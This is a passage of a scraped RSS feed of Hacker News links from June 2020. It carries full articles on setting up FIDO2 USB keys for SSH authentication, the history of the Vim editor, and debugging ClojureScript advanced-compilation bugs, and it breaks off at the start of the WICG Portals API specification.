target="_blank">@don_pittis</a></u></em></p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/business/zoom-trust-business-pandemic-1.5628638?cmp=rss</link>
            <guid isPermaLink="false">hacker-news-small-sites-23689614</guid>
            <pubDate>Tue, 30 Jun 2020 13:11:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to use FIDO2 USB keys with SSH]]>
            </title>
            <description>
<![CDATA[
Score 147 | Comments 96 (<a href="https://news.ycombinator.com/item?id=23689499">thread link</a>) | @stelabouras
<br/>
June 30, 2020 | https://www.stavros.io/posts/u2f-fido2-with-ssh/ | <a href="https://web.archive.org/web/*/https://www.stavros.io/posts/u2f-fido2-with-ssh/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <article>
        <div>
            <div>
                <div>
                    
                    <p>Secure, easy to use, cheap: Pick three</p><p>I recently installed Ubuntu Wacky Whatever, the latest version, and I’m very excited about it shipping with SSH 8.2, which means that I can finally use hardware USB keys for secure, easy to use authentication.
If securing your devices has been something you’ve wanted to easily do yourself, read on, because it’s finally happening.</p>
<h2>FIDO2</h2>
<p>One of the most exciting security-related developments recently has been the development of <a href="https://webauthn.guide/">WebAuthn</a> and FIDO2, which are basically euphemisms for “nice security stuff”.
In summary, WebAuthn and FIDO2 aim to make it really easy to use security devices with stuff by standardizing the way the two talk to each other, and using better terms than “stuff”.</p>
<p>This is great news for us, because now we can have dirt-cheap USB keys that can be used to secure all our authentication very easily, without requiring any special security knowledge.
All you need to know to be completely immune to phishing, password theft, and a whole host of other ways of losing Bitcoin is to just plug your USB key in, press the little button/type your PIN/enter your fingerprint, and you’re logged in.</p>
<p>What does this have to do with SSH?
Very little, but<!-- break --> I like rambling, it is known.</p>
<h3>Using FIDO2 with SSH</h3>
<div><p><img src="https://www.stavros.io/posts/u2f-fido2-with-ssh/shoulder-small.jpg"><a href="https://unsplash.com/photos/OLzlXZm_mOw" title="Photo from https://unsplash.com/photos/OLzlXZm_mOw" target="_blank" rel="noopener noreferrer"><i></i></a></p><p><span>Deanna had heard of phishing, and was extremely suspicious of the sound of rubber boots.</span></p></div><p>As you may have suspected from the two seemingly unrelated points above, and the dead giveaway title of this section, it would be tremendous if we could use FIDO2 keys to authenticate over SSH, and the OpenSSH developers made it happen.
OpenSSH now supports FIDO (U2F) and FIDO2 for authentication, with FIDO2 with resident keys having a nicer UX.</p>
<p>At a high level, the USB device (FIDO2 devices don’t have to be USB, but they usually will be) will generate a <span data-expounder="secret-key">secret key</span>.
<span data-expounded="secret-key">
The device can then use this secret key to prove that you have the device in your possession, without the key ever leaving the device.
That means that, by extension, you can use the device to prove you are who you say you are to any server who asks.
</span>
The key is either stored on the device (called “resident key”), which requires the device to support storage, or it isn’t, and <span data-expounder="storage">you need to store the data somewhere else</span>.</p>
<p><span data-expounded="storage">
The way this works, in my understanding (which I’m not certain about and please correct me if I’m wrong), is the following:
Each device comes from the factory with one key pair/seed built in, but it can accept an additional seed to derive more pairs from, by combining its current seed with the one given.
This allows devices to generate keys without having any storage space, but it does require you to be giving them the seed every time.
Devices with “resident key” capabilities can store the whole seed on their memory, and don’t need you to do anything else.
</span></p>
<p>The benefit of using a device like this including eliminating phishing, password theft, authentication replay, and lots of other attacks.
Since the device authenticates to a specfic realm (server address/URL/etc), an attacker can’t reuse one site’s authentication on another site, which makes phishing impossible.
Nobody can steal your password or private key either, since it’s on the device itself and extracting it is impossible.
The only plausible attack is physical theft with the device, which is mitigated by making the device ask for a PIN or fingerprint and wiping itself after a few wrong attempts.</p>
<p>Another benefit with having this built into SSH is that you don’t specifically need a Yubikey, or to mess with extra software like Yubikey agent, PIV mode or anything else.
You just plug any FIDO2-compatible key in, and you can use it with SSH.
I tried the following on both my Yubikey 5C, Yubikey FIDO2 and Yubikey NEO, they worked like a charm on all of them, but “resident key” mode only works on the 5C and later versions of the FIDO2 key.</p>
<h2>Actual usage</h2>
<div><p><img src="https://www.stavros.io/posts/u2f-fido2-with-ssh/padlocks-small.jpg"><a href="https://unsplash.com/photos/bBavss4ZQcA" title="Photo from https://unsplash.com/photos/bBavss4ZQcA" target="_blank" rel="noopener noreferrer"><i></i></a></p><p><span>With twelve padlocks, the city of Indianapolis was sure it had put a stop to miscreants stealing its favorite fence.</span></p></div><p>After all the needless detail about how devices work, we’re ready to actually use one for SSH.
Setting that up is really simple, basically one or two commands (depending on the method) with no extra software to install, though you will need to be running OpenSSH 8.2 on both client and server.</p>
<p>I will split the instructions into two parts, one for if your key supports (and you want to use) the resident key mode, and one for if it doesn’t.
There’s no harm in using either method, so if you don’t know if your device supports resident key mode, just try the first method and continue to the second one if it fails.</p>
<h3>Resident key mode</h3>
<p>Use the following command to generate a key and store it on the device:</p>
<div><pre><span></span>ssh-keygen -t ed25519-sk -O resident -f ~/.ssh/id_mykey_sk
</pre></div>
<p>SSH will ask you to enter your PIN and touch your device, and then save the key pair where you told it.
If that command complains about ed25519 not being available, try this one:</p>
<div><pre><span></span>ssh-keygen -t ecdsa-sk -O resident -f ~/.ssh/id_mykey_sk
</pre></div>
<p>OpenSSH will save two files, one called <code>id_mykey_sk</code>, and one called <code>id_mykey_sk.pub</code>.
You only really need the latter, it’s your public key, and you can now add it to the <code>authorized_keys</code> file of any server that runs OpenSSH 8.2 and above.</p>
<p>To add your private key to the SSH agent, you can either copy <code>id_mykey_sk</code> to your <code>~/.ssh/</code> directory, or (if you’re at a new computer and don’t have the key with you), run</p>

<p>with your device plugged in.
This will add the key to the SSH agent, and you will be able to connect to servers immediately.</p>
<h3>Non-resident key mode</h3>
<p>The non-resident key mode is the same as the previous mode, except you can’t load your key with <code>ssh-add -K</code> directly from the device.
As before, run:</p>
<div><pre><span></span>ssh-keygen -t ed25519-sk -f ~/.ssh/id_mykey_sk
</pre></div>
<p>SSH will ask you to enter your PIN and touch your device, and then save the key pair where you told it.
If that command complains about ed25519 not being available, try this one:</p>
<div><pre><span></span>ssh-keygen -t ecdsa-sk -f ~/.ssh/id_mykey_sk
</pre></div>
<p>OpenSSH will save two files, one called <code>id_mykey_sk</code>, and one called <code>id_mykey_sk.pub</code>.
You need both of these files, store <code>id_mykey_sk</code> in your <code>~/.ssh/</code> directory (where it got generated) and add the <code>id_mykey_sk.pub</code> file to any server you want to log in to.</p>
<p>That’s it, when you try to log in, OpenSSH will ask you for your PIN and to touch the device.</p>
<h2>Security considerations</h2>
<p>You can pass the <code>no-touch-required</code> option to <code>ssh-keygen</code> to tell it that you don’t want it to require touching the device every time, but I haven’t had great results with enabling that.
If you try it, let me know how well it works in the comments, but it’s probably better for security if you leave it disabled.</p>
<p>Storing your key on the device means that nobody will be able to steal it (hopefully your device has a PIN or other authentication method set), but untrusted computers might still be able to send commands over the SSH session after you connect.
Don’t SSH from computers you don’t trust, and be extra careful when using SSH forwarding (the <code>-A</code> option), as the server can then ask your computer to authenticate to other servers on your behalf.</p>
<h2>Epilogue</h2>
<p>I’m very excited about FIDO2 in general, and for SSH authentication specifically, because we finally have a way to secure authentication that my parents can easily use, with a much smaller attack surface.
I’m particularly interested in seeing how WebAuthn takes off for authenticating on the web without usernames and passwords (see my <a href="https://gitlab.com/stavros/django-webauthin">django-webauthin</a> library for a demo), and hope it becomes widespread.</p>
<p>If you have any feedback, please <a href="https://twitter.com/intent/user?screen_name=Stavros">Tweet</a> or <a href="https://mastodon.host/@stavros">toot</a> at me, or email me directly.
Also, check out my <a href="https://www.youtube.com/c/StavrosKorokithakis/">YouTube channel</a> (because who <em>doesn’t</em> have a YouTube channel these days?), where I frequently livestream my late-night maker sessions.</p>

                    
                </div>
            </div>
        </div>
        </article>
    </div></div>]]>
            </description>
            <link>https://www.stavros.io/posts/u2f-fido2-with-ssh/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23689499</guid>
            <pubDate>Tue, 30 Jun 2020 12:53:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Did Vim Become So Popular?]]>
            </title>
            <description>
<![CDATA[
Score 358 | Comments 487 (<a href="https://news.ycombinator.com/item?id=23689091">thread link</a>) | @nikolalsvk
<br/>
June 30, 2020 | https://pragmaticpineapple.com/how-did-vim-become-so-popular/ | <a href="https://web.archive.org/web/*/https://pragmaticpineapple.com/how-did-vim-become-so-popular/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>June 29, 2020<!-- --> | <!-- -->about <!-- -->6<!-- --> <!-- -->minutes<!-- --> to read<!-- --> </p></header><section><p><span>
      <span></span>
  <img alt="Old cash register" title="Old cash register" src="https://pragmaticpineapple.com/static/dacbfe17624e2d3db849681b4631992c/1c72d/cover.jpg" srcset="https://pragmaticpineapple.com/static/dacbfe17624e2d3db849681b4631992c/a80bd/cover.jpg 148w,
https://pragmaticpineapple.com/static/dacbfe17624e2d3db849681b4631992c/1c91a/cover.jpg 295w,
https://pragmaticpineapple.com/static/dacbfe17624e2d3db849681b4631992c/1c72d/cover.jpg 590w,
https://pragmaticpineapple.com/static/dacbfe17624e2d3db849681b4631992c/a8a14/cover.jpg 885w,
https://pragmaticpineapple.com/static/dacbfe17624e2d3db849681b4631992c/fbd2c/cover.jpg 1180w,
https://pragmaticpineapple.com/static/dacbfe17624e2d3db849681b4631992c/e5bc7/cover.jpg 5184w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>
<p>You probably heard of Vim, the almighty text-editor that is everywhere and
a place where <a href="https://stackoverflow.com/questions/11828270/how-do-i-exit-the-vim-editor">people get trapped from time to time</a>.
If you are hearing from your local DevOps engineer how Vim is excellent and
fast, you probably thought about giving it a try. But how did it come
to this? How did Vim-craze take over the world at some point?</p>
<p>If we look at the
<a href="https://insights.stackoverflow.com/survey/2019#technology-_-most-popular-development-environments">StackOverflow survey for 2019</a>
about the most popular development environments, Vim is still there on the 5th
place, with around 25% of Web Developers using it. Fifth place is pretty neat
considering the first Vim release happened almost 30 years ago (yeah, you read
that right, Vim got first released in 1991).</p>
<p>To better understand why and how Vim got (and is) so popular, it is best to
look into the roots of how it all started. Before <code>vim</code>, there was <code>vi</code>, before
<code>vi</code> there was <code>ed</code>. What are all these two or three letter words, and
what is the story behind it? Let us dive in and figure out.</p>
<h2 id="punch-cards-and-line-editors"><a href="#punch-cards-and-line-editors" aria-label="punch cards and line editors permalink"></a>Punch cards and line editors</h2>
<p>It might be apparent today why we have text editors and fully-fledged IDE
(Integrated Development Environment), but what did we have before that?
As you may know, early forms of programming involved putting <a href="https://en.wikipedia.org/wiki/Punched_card">papers with
holes (punch cards)</a> inside a
computer. The order in which you placed these in was very essential. For example, this
is a picture of 4.5 megabytes data, stacked in 62500 punch cards. Imagine
dropping that and having to sort it again.</p>
<p><span>
      <span></span>
  <img alt="Punch card stack" title="Punch card stack" src="https://pragmaticpineapple.com/static/ad5b0a6e4d363f9e5c40fbdcdbe559fb/e6523/punch-card-stack.jpg" srcset="https://pragmaticpineapple.com/static/ad5b0a6e4d363f9e5c40fbdcdbe559fb/a80bd/punch-card-stack.jpg 148w,
https://pragmaticpineapple.com/static/ad5b0a6e4d363f9e5c40fbdcdbe559fb/1c91a/punch-card-stack.jpg 295w,
https://pragmaticpineapple.com/static/ad5b0a6e4d363f9e5c40fbdcdbe559fb/e6523/punch-card-stack.jpg 532w" sizes="(max-width: 532px) 100vw, 532px" loading="lazy">
    </span></p>
<p>
  OK, mom, I'll come down, just need to re-stack my new blog post
</p>
<p>Punch cards proved a bit inefficient as computer power and storage grew, and
programming evolved. Eventually, people moved away from punch cards, and then
there came the era of “line editors.” One great example of this is an
<a href="https://en.wikipedia.org/wiki/Ed_(text_editor)"><code>ed</code> editor</a>. Let’s not forget to
mention <a href="https://www.bell-labs.com/usr/dmr/www/qedman.html">QED editor</a>,
<code>ed</code>’s predecessor.</p>
<h2 id="using-a-line-editor"><a href="#using-a-line-editor" aria-label="using a line editor permalink"></a>Using a line editor</h2>
<p>If you are on Linux or Mac OS, open your terminal and type <code>ed</code>. You
will get a simple line editor, which will greet you with silence.
If you are amazed by this finding (as I was), you can try playing with it for a while. To write
a file, start typing <code>a</code> and press enter, then write your text. Typing <code>.</code>
following an enter will exit the append (insert) mode. Then, to write a file, you can
type <code>w myfile.txt</code> and press enter and lastly write <code>q</code> and enter to exit.</p>
<div data-language="text"><pre><code># ed
a
Hey there!
I am using ed right now, how cool.
OK, that's enough.
.
w myfile.txt
64
q</code></pre></div>
<p>As you may notice, there are similarities between working with <code>ed</code> and with
today’s <code>vim</code>. If you use Vim, you can say you would get the hang of <code>ed</code> pretty
quickly.</p>
<h2 id="vims-dad---the-vi"><a href="#vims-dad---the-vi" aria-label="vims dad   the vi permalink"></a>Vim’s dad - The Vi</h2>
<p>After <code>ed</code>, then came the <code>em</code> - <a href="http://www.eecs.qmul.ac.uk/~gc/history/">the “editor for mortals”</a>.
It could do similar things as <code>ed</code>, but it is ‘less cryptic’ and built for
regular people. Based on <code>em</code>’s code, Bill Joy developed <code>ex</code>, which
stands for “extended ed”! It was significant because <code>ex</code> had, besides the previous
modes, the <code>visual</code> mode, which will show the whole file on your screen. You
must be thinking - duh, how didn’t they <a href="https://www.bell-labs.com/usr/dmr/www/qed.html">think of that earlier</a>?
Having that thing show up on computers in those days was pretty tricky,
and some considered it a resource hog. But, at that point, the benefits had
outweighed objections, and having a file opened on your screen as you edit it
became today’s standard.</p>
<p><span>
      <span></span>
  <img alt="Vi editor" title="Vi editor" src="https://pragmaticpineapple.com/static/dd4157ecc91779d4e893edf95e85f3f5/fcda8/vi.png" srcset="https://pragmaticpineapple.com/static/dd4157ecc91779d4e893edf95e85f3f5/12f09/vi.png 148w,
https://pragmaticpineapple.com/static/dd4157ecc91779d4e893edf95e85f3f5/e4a3f/vi.png 295w,
https://pragmaticpineapple.com/static/dd4157ecc91779d4e893edf95e85f3f5/fcda8/vi.png 590w,
https://pragmaticpineapple.com/static/dd4157ecc91779d4e893edf95e85f3f5/efc66/vi.png 885w,
https://pragmaticpineapple.com/static/dd4157ecc91779d4e893edf95e85f3f5/c83ae/vi.png 1180w,
https://pragmaticpineapple.com/static/dd4157ecc91779d4e893edf95e85f3f5/3c492/vi.png 1300w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>
<p>And like that, the <strong>vi</strong>sual mode was born. Later, the executable <code>vi</code> got
introduced in operating systems, but you can still access <code>ex</code> commands by
typing <code>:</code> in <code>vi</code>/<code>vim</code>. The <code>ex</code> got released in 1976, and the <code>vi</code>
executable got released in 1979. 40-something years ago! But, how did <code>vim</code> came to life?</p>
<h2 id="the-imitation-game"><a href="#the-imitation-game" aria-label="the imitation game permalink"></a>The Imitation Game</h2>
<p>A couple of years later, many <code>vi</code> clones emerged (my favorite one is
<a href="https://en.wikipedia.org/wiki/Elvis_(text_editor)">Elvis</a>). One of them was “Vi
Improved” which was created by Bram Moolenaar - the name you now see when you
try to open <code>vim</code> in your terminal. In the large pool of different <code>vi</code> clones,
<code>vim</code> managed to stand out. Bram used a clone of <code>vi</code> called <code>STEVIE</code> (nice
name, BTW), and noticed that it lacks many of <code>vi</code>’s commands. He added
some new features and made it compatible with <code>vi</code> and released it under
the name “Vi Imitation” (this later changed to “Vi Improved”). The name <code>vim</code> came in version 2.0 in 1993 and
stayed like that until the present day. But how did <code>vim</code> achieve fame? It had a
<a href="https://en.wikipedia.org/wiki/Vim_(text_editor)#Features_and_improvements_over_vi">bunch of excellent features</a>
at that time, and it was compatible with <code>vi</code>. Features and compatibility attracted a lot of folks to use it.</p>
<h2 id="half-a-century-of-contributions"><a href="#half-a-century-of-contributions" aria-label="half a century of contributions permalink"></a>Half a century of contributions</h2>
<p>If you take a look at the essential commands to move around in Vim: <code>h</code>, <code>j</code>,
<code>k</code>, and <code>l</code>, these all pull roots from the old <code>vi</code> days. Bill Joy’s
<a href="https://en.wikipedia.org/wiki/ADM-3A">keyboard at that time</a>
didn’t have cursors to move around. Also, the <code>ESC</code> key was in the place
of today’s <code>TAB</code> key. Take a look at how it was back in the day:</p>
<p><span>
      <span></span>
  <img alt="ADM 3A keyboard" title="ADM 3A keyboard" src="https://pragmaticpineapple.com/static/b20427945c23d658e5827bddebee2fb6/fcda8/adm-3a-keyboard.png" srcset="https://pragmaticpineapple.com/static/b20427945c23d658e5827bddebee2fb6/12f09/adm-3a-keyboard.png 148w,
https://pragmaticpineapple.com/static/b20427945c23d658e5827bddebee2fb6/e4a3f/adm-3a-keyboard.png 295w,
https://pragmaticpineapple.com/static/b20427945c23d658e5827bddebee2fb6/fcda8/adm-3a-keyboard.png 590w,
https://pragmaticpineapple.com/static/b20427945c23d658e5827bddebee2fb6/efc66/adm-3a-keyboard.png 885w,
https://pragmaticpineapple.com/static/b20427945c23d658e5827bddebee2fb6/2bef9/adm-3a-keyboard.png 1024w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
    </span></p>
<p>Commands to replace text like <code>:%s/text_to_replace/text_to_replace_it_with/</code> is
also something from that era. Having to type <code>:</code> to perform a command
was an answer to <code>ed</code>’s complete silence when you first enter the editor.</p>
<p>What I am trying to say that <code>vim</code> is an effort of over half a century of
good idea accumulation, putting lots of effort into being backward compatible.
Yes, useful features probably made Vim famous. But what kept Vim in the loop is
the compatibility with almost everything you can think about. Wherever you SSH
today, you can start the Vim session, or at least Vi session. That is a strong
(if not the strongest) point to learn it nowadays.</p>
<p>If you’re not someone who jumps from server to server and navigates files on
there, the point of having Vim everywhere doesn’t bother you. But
still, there are a couple of reasons why it might be valuable to you. I am forming
a new blog post explaining why you should learn Vim in 2020. If you are interested
in this, consider subscribing to the <a href="https://pragmaticpineapple.com/newsletter">newsletter</a>.</p>
<h2 id="final-thoughts"><a href="#final-thoughts" aria-label="final thoughts permalink"></a>Final thoughts</h2>
<p>Thanks for reading this far, I appreciate it. I hope this blog post shed some
light on how Vim became what it is today. I also hope the post inspired you to
try it out. You never know when you might need it, or you like it so much that
you decide to switch to using Vim fully.</p>
<p>Maybe you get a Vim mode inside your IDE or VSCode, who knows. I am not saying
that Vim should replace what you are using now, but trying to learn and
configure it will improve your skills and abilities. On the other hand, it doesn’t really
matter what editor you use, it is what you do with it!</p>
<p>At the end of the day, it’s the matter of finding the proper editor
(tool) that makes you do what you do even better.</p>
<p>If you liked the blog post, you can share it with your friends and coworkers below:</p>
<blockquote><p lang="en" dir="ltr">I just published a new blog post on the history of Vim and why it became popular. Also, there's an origin story on why you can use h, j, k, and l to move around in Vim. Check it out ⏬<a href="https://t.co/S3p50cgYPW">https://t.co/S3p50cgYPW</a></p>— Nikola Đuza (@nikolalsvk) <a href="https://twitter.com/nikolalsvk/status/1277888730414669825?ref_src=twsrc%5Etfw">June 30, 2020</a></blockquote> 
<p>Thanks for reading, catch you in the next one, cheers 🍻</p></section><hr><p>Tagged as:<!-- --> <span><a href="https://pragmaticpineapple.com/tags/vim/">Vim</a></span></p></article></div>]]>
            </description>
            <link>https://pragmaticpineapple.com/how-did-vim-become-so-popular/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23689091</guid>
            <pubDate>Tue, 30 Jun 2020 11:46:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Taming Advanced Compilation bugs in ClojureScript projects]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 5 (<a href="https://news.ycombinator.com/item?id=23688721">thread link</a>) | @k1ll3rf0x
<br/>
June 30, 2020 | https://dev.solita.fi/2020/06/25/taming-cljs-advanced-compilation.html | <a href="https://web.archive.org/web/*/https://dev.solita.fi/2020/06/25/taming-cljs-advanced-compilation.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>Imagine this: You have a large multi-module ClojureScript project, and you are planning to make a new deployment in the
production.
Your project is using CLJS Compiler’s Advanced Optimizations mode.
Everything seems to be working smoothly. You are performing some last E2E tests before making a release.<br>
Then, a faulty module loads.<br>
<strong>BAM!</strong> You are slapped in the face with an error something like this:</p>

<div><div><pre><code>Uncaught Error: No protocol method IMultiFn.-add-method defined for type function: function XR() { [native code] }
    at Nb ((index):964)
    at yh ((index):443)
    at (index):236
(index):143 Uncaught TypeError: Cannot read property 'j' of undefined
    at NU ((index):143)
    at login-a5a67c0fffdfa158b7220c8c2553253b645e4e2e.js:169
</code></pre></div></div>

<p>You did not expect this. There were no significant new changes since the last build, and the unit tests were all
hunky-dory.<br>
Additionally, everything worked fine when using Firefox, but now the compiled code crashes on Google Chrome. 
What is going on? The release deadline is looming and you have to fix this ASAP.</p>

<p><img src="https://dev.solita.fi/img/taming-cljs-advanced-compilation/slap.png" alt="Holy Stack Trace, Batman!"><br>
<em>Holy Stack Trace, Batman!</em></p>

<p>When you build your code with the CLJS compiler, it emits JavaScript code that is compatible with the 
advanced_optimizations level of the Google Closure compiler. Then, if <code>":optimizations :advanced"</code> compiler option is
enabled, the CLJS compiler will minify the result with Closure Compiler’s Advanced Optimizations.</p>

<p>Closure Compiler’s Advanced Optimizations mode can cause some errors in your build that can be uncomfortable to
track down if you are new to Closure Compiler.
On top of that, help might be hard to find if you are trying to search the web with the error message because the function
names are all mangled up.</p>

<p>It is better to avoid these errors by keeping the Advanced Compilation mode in mind from the start of the project. 
I’ll describe some common methods to help you to avoid and resolve advanced compilation issues, and 
show how to resolve the more uncommon issue that was described in the beginning and what is the reason behind it.</p>

<h2 id="avoiding-issues-with-advanced-compilation">Avoiding issues with Advanced Compilation</h2>

<p>It is recommended to use <code>":optimizations :advanced"</code> CLJS compiler option for your production builds.
You will greatly reduce your final build size by using more aggressive advanced transformations such as dead code 
removal and aggressive renaming.<br>
Read more about the advanced transformations at here: <a href="https://developers.google.com/closure/compiler/docs/compilation_levels#advanced_optimizations">Closure Compiler compilation levels</a></p>

<p>Different build tools such as lein-cljsbuild and shadow-cljs might pass different default options to Closure Compiler.
I won’t cover the differences in this blog post, but instead, I will provide some general guidelines on how to avoid
issues with advanced compilation in your project.</p>

<h3 id="keep-your-externs-in-a-good-shape">Keep your externs in a good shape</h3>
<p><a href="https://clojurescript.org/guides/externs">Extern</a> is a mechanism for declaring names that should not be munged (renamed) by Closure Compiler.
When you are using external libraries, make sure that they come <a href="http://cljsjs.github.io/">bundled</a>
with externs if you are using a build tool like lein-cljsbuild. Or, provide externs files of your own if needed. 
Otherwise, Closure Compiler will munge references to externally defined symbols unintentionally during advanced 
compilation causing errors found only later when running the compiled code.</p>

<p>To add externs of your own, use a compiler option for example: <code>":externs ["externs.js"]"</code> and provide an
externs.js file in your working directory.</p>

<p>Also, It is good to use <code>":infer-externs true"</code> compiler option. This option will enable generating externs automatically
for JavaScript interop calls.</p>

<p>It is worth to know, that Closure Compiler includes externs for stable JavaScript APIs, but newer features that have an
experimental status might not be included yet. The experimental APIs change very quickly, so it makes no sense to include
them in the Closure Compiler tool. So, if you are planning to use some experimental features, make sure 
you add them to your own externs file.</p>

<p>Read more about using external JavaScript libraries from <a href="http://lukevanderhart.com/2011/09/30/using-javascript-and-clojurescript.html">here</a></p>

<h3 id="splitting-code-might-cause-name-collisions">Splitting code might cause name collisions</h3>
<p>If you are <a href="https://clojurescript.org/guides/code-splitting">splitting</a> your CLJS code into <code>:modules</code>, you might want
to use <code>:rename-prefix "..."</code> compiler option.<br>
Split modules are running in the global JavaScript scope, so they might interfere with other code loaded on the same page 
(e.g. Google Analytics) and cause unpredictable errors if name collisions occur.
When using <code>":rename-prefix"</code>, it is best to use a very short string as a prefix, for example: <code>:rename-prefix "r_"</code></p>

<p>This will increase the final (gzipped) build size slightly because now each munged global variable will be prefixed with “r_”.</p>

<h3 id="wrap-cljs-output-to-prevent-global-scope-pollution">Wrap CLJS output to prevent global scope pollution</h3>
<p>Closure Compiler will generate a lot of global variables during advanced compilation that can cause name collisions
with other code running on the same page.
If you are loading other code on the same page, and you are not splitting code into multiple modules you can utilize
 the <code>":output-wrapper true"</code> compiler option. The compiler will wrap the outputted JavaScript code with the default 
<code>"(function(){…​};)()"</code>. This will prevent polluting the global JavaScript scope and thus will prevent conflicts
with other external code.</p>

<p>However, if you have multiple modules in your project you must add a compiler option <code>:rename-prefix-namespace "..."</code>.
This enables each module to access the variables defined in the other modules it depends on.
This works similarly to the <code>":rename-prefix"</code> option. The difference is that every global variable will be now
scoped under one global variable instead of many. For example, if you use a prefix-namespace like this:
<code>:rename-prefix-namespace "P"</code>, the compiled code will refer to variable <code>"foo"</code> like <code>"p.foo"</code>. 
This option will also increase the final build size like the <code>":rename-prefix"</code> option, so think before using it.</p>

<p>There are other interesting compiler options not directly related to advanced optimizations, such as <code>":fn-invoke-direct"</code> 
which can be useful for optimizing performance-critical code. You can read more about them in CLJS 
<a href="https://clojurescript.org/reference/compiler-options">documentation</a>.</p>

<h2 id="debugging-advanced-compilation-bugs">Debugging Advanced Compilation bugs</h2>

<p>If you suspect you might have a problem with advanced compilation, often hinted by errors in the browser 
console that might make no sense, it is best to approach the problem in the following way.</p>

<p>Add two additional compiler options <code>":pseudo-names true"</code> and <code>":pretty-print true"</code> for your Advanced Compilation build.
Your error will now show a readable name that corresponds to the name in the source code. 
This will help you to deduce if an extern definition is missing.</p>

<p>Additionally, if your error goes away after enabling the above-mentioned compiler options, it gives you a hint
of a possible name collision problem. When there is a problem with a munged variable name colliding with an external 
variable name, the problem disappears when the munged variable name changes, like what happens when enabling the :pseudo-names option.<br>
Often, if not fixed properly, the name collision issues can arise and then be magically “fixed” when one adds new 
changes, which in turn causes changes in munged variable names in the build output. It is best to eliminate these problems for good.</p>

<h3 id="sometimes-something-funky-can-happen">Sometimes, something funky can happen</h3>
<p>In some rare cases, there might be some advanced compilation issues that are not so easy to avoid.
Let’s go back to the beginning. 
We had an error when running our built web app in Chrome. Firefox had no issues.</p>
<div><div><pre><code>Uncaught Error: No protocol method IMultiFn.-add-method defined 
                for type function: function XR() { [native code] }
    at Nb ((index):964)
    at yh ((index):443)
    at (index):236
</code></pre></div></div>

<p>The Stack Trace was pointing to a certain multimethod in the CLJS source code. 
At the first glance, the error might make no sense. The compiled code is trying to invoke -add-method IMultiFn protocol method 
for a function named XR. When searching for the munged <code>XR</code> in the build output, everything seems to be fine.
<code>XR</code> looks good and should work, right?
The key thing to notice in the error message is the <code>"[native code]"</code> part of <code>"function XR() { [native code] }"</code>.
This tells us, that the compiled code is trying to invoke a native browser function <code>XR</code> instead of our munged <code>XR</code>. 
By chance, the Closure Compiler named our multimethod to <code>XR</code> which happens to collide with the browser provided
<code>XR</code> function.</p>

<p>Occasionally you can encounter errors like this when using an older version of Closure Compiler.
Developers add new features to web browsers all the time. When a user upgrades his/her web browser there is a chance 
a new reserved word was added that collides with a munged variable.</p>

<p>It turns out, XR is a reserved word added by the WebXR platform API. When the error occurred “XR” was added in the newest 
version of Google Chrome, but not yet in Firefox. Newer Closure Compiler versions take this into account by providing
an extern for it. It is not always easy to upgrade the ClojureScript version and thus the Closure Compiler used in a project.<br>
In that case, you can fix the problem fast by adding a custom extern of your own:</p>
<div><div><pre><code><span>// externs.js</span>

<span>var</span> <span>XR</span> <span>=</span> <span>{};</span>
</code></pre></div></div>

<h2 id="conclusion">Conclusion</h2>

<p>Many times, Advanced Compilation issues with CLJS are easy to avoid with proper preparation. On rare occasions, some
stranger errors can happen. Thus, test your builds with the current browser versions and learn to debug advanced 
compilation issues swiftly to prevent wasting precious time.</p>

    </article></div>]]>
            </description>
            <link>https://dev.solita.fi/2020/06/25/taming-cljs-advanced-compilation.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23688721</guid>
            <pubDate>Tue, 30 Jun 2020 10:41:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Portals API]]>
            </title>
            <description>
<![CDATA[
Score 120 | Comments 79 (<a href="https://news.ycombinator.com/item?id=23688699">thread link</a>) | @ginkoid
<br/>
June 30, 2020 | https://wicg.github.io/portals/ | <a href="https://web.archive.org/web/*/https://wicg.github.io/portals/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
   <details>
    <summary>This spec is behind the explainer</summary>
    <p>This specification document has not yet been updated to reflect the 2020-04 updates to <a href="https://github.com/WICG/portals#readme">the explainer</a>. We’ll fix that as soon as we
  can, but please be aware that there are probably contradictions, and the explainer should be taken
  as more authoritative for the time being.</p>
   </details>
   <section>
    <h2 data-level="1" id="intro"><span>1. </span><span>Introduction</span><a href="#intro"></a></h2>
    <p><em>This section is non-normative.</em></p>
    <p>This specification extends <a data-link-type="biblio" href="#biblio-html">[HTML]</a> to define a new kind of <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#top-level-browsing-context" id="ref-for-top-level-browsing-context">top-level browsing context</a>,
  which can be embedded in another document, and a mechanism for replacing the contents of another
  top-level browsing context with the previously embedded context.</p>
    <p>It is structured as a series of patches to HTML and other specifications, with each major section
  indicating where each it would be placed in the event of eventual graduation from incubation.</p>
   </section>
   <section>
    <h2 data-level="2" id="concepts"><span>2. </span><span>Portal browsing contexts</span><a href="#concepts"></a></h2>
    <p><em>The following section would be added as a new sub-section of <a data-link-type="biblio" href="#biblio-html">[HTML]</a>'s <a href="https://html.spec.whatwg.org/#windows">Browsing contexts</a> section.</em></p>
    <p>Every <a data-link-type="dfn" href="https://html.spec.whatwg.org/multipage/browsers.html#browsing-context" id="ref-for-browsing-context">browsing context</a> has a <dfn data-dfn-type="dfn" data-noexport="" id="portal-state">portal state</dfn>, which may be "<code>none</code>" (the default), "<code>portal</code>" or "<code>orphaned</code>".
